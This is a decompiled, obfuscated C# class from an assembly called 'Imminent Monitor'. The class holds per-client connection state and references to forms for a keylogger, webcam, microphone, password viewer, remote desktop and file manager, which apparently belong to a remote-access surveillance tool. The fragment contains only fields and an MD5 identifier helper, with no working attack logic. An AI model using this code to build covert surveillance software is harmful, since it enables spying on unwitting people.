// Decompiled with JetBrains decompiler
// Type: GClass32
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

public sealed class GClass32 : IDisposable
{
  public GClass18 gclass18_0;
  public GClass18 gclass18_1;
  public GClass18 gclass18_2;
  public GClass18 gclass18_3;
  public GClass30 gclass30_0;
  public string string_0;
  public bool bool_0;
  public string string_1;
  public string string_2;
  public string string_3;
  public string string_4;
  public string string_5;
  public string string_6;
  public dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.ConnectionSocketPacket connectionSocketPacket_0;
  public int int_0;
  public int int_1;
  public byte[] byte_0;
  public ushort ushort_0;
  public GClass27 gclass27_0;
  public string string_7;
  public string string_8;
  public string string_9;
  public string string_10;
  public string string_11;
  public Stopwatch stopwatch_0;
  public bool bool_1;
  public string string_12;
  public int int_2;
  public long long_0;
  public bool bool_2;
  public long long_1;
  public long long_2;
  public string string_13;
  public string string_14;
  public bool bool_3;
  public string string_15;
  public NewFormSystemManagers newFormSystemManagers_0;
  public FormFileManager formFileManager_0;
  public FormDesktop formDesktop_0;
  public FormProxy formProxy_0;
  public FormCamera formCamera_0;
  public FormKeylogger formKeylogger_0;
  public FormChat formChat_0;
  public FormMicrophone formMicrophone_0;
  public FormFileThumbnail formFileThumbnail_0;
  public FormPassword formPassword_0;
  public FormMessageBox formMessageBox_0;
  public ScriptingForm scriptingForm_0;
  public FormManagement formManagement_0;
  public FormExecuteUpdate formExecuteUpdate_0;
  public FormWindowsRDP formWindowsRDP_0;
  public ListViewItem listViewItem_0;
  public ListViewItem listViewItem_1;
  public ListViewItem listViewItem_2;
  public ListViewItem listViewItem_3;
  public ListViewItem listViewItem_4;
  public ListViewItem listViewItem_5;
  public UserControlThumbnail userControlThumbnail_0;
  private bool bool_4;

  public GClass32()
  {
    this.byte_0 = Encoding.UTF8.GetBytes("1337");
    this.stopwatch_0 = new Stopwatch();
    this.bool_1 = false;
    this.string_12 = "0";
    this.int_2 = 0;
    this.long_0 = 0L;
    this.long_1 = 0L;
    this.long_2 = 0L;
    this.bool_3 = false;
    this.string_15 = (string) null;
    this.newFormSystemManagers_0 = (NewFormSystemManagers) null;
    this.formFileManager_0 = (FormFileManager) null;
    this.formDesktop_0 = (FormDesktop) null;
    this.formProxy_0 = (FormProxy) null;
    this.formCamera_0 = (FormCamera) null;
    this.formKeylogger_0 = (FormKeylogger) null;
    this.formChat_0 = (FormChat) null;
    this.formMicrophone_0 = (FormMicrophone) null;
    this.formFileThumbnail_0 = (FormFileThumbnail) null;
    this.formPassword_0 = (FormPassword) null;
    this.listViewItem_0 = (ListViewItem) null;
    this.listViewItem_1 = (ListViewItem) null;
    this.listViewItem_2 = (ListViewItem) null;
    this.listViewItem_3 = (ListViewItem) null;
    this.listViewItem_4 = (ListViewItem) null;
    this.listViewItem_5 = (ListViewItem) null;
  }

  public string method_0()
  {
    if (Operators.CompareString(this.string_13, string.Empty, false) != 0)
      return this.string_13;
    this.string_13 = string.Format("{0} - {1}", (object) this.string_1, (object) this.method_1(this.string_1 + this.string_2 + this.string_7));
    return this.string_13;
  }

  private string method_1(string string_16)
  {
    using (MD5 md5 = MD5.Create())
      return BitConverter.ToString(md5.ComputeHash(Encoding.UTF8.GetBytes(string_16))).Replace("-", string.Empty).ToLower();
  }

  protected virtual void vmethod_0(bool bool_5) => this.bool_4 = true;

  public void Dispose()
  {
    this.vmethod_0(true);
    GC.SuppressFinalize((object) this);
  }
}
